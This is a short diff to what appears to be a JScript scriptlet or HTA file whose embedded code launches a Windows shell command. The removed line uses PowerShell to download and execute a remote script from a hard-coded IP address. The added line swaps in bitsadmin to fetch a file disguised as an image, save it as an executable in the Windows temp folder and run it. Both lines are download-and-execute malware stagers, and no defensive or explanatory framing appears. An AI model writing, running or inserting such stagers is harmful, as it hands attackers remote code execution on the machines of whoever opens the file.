@@ -13,7 +13,8 @@
 <script language="JScript">
 <![CDATA[
 
-		var r = new ActiveXObject("WScript.Shell").Run("powershell -Command 'iex(new-object net.webclient).downloadstring(\"http://106.15.201.82/info.ico\")'");
+		var r = new ActiveXObject("WScript.Shell").Run("bitsadmin /transfer n http://106.15.201.82/1.jpg c:\windows\temp\a.exe && c:\windows\temp\a.exe
+");
 	
 	
 ]]>
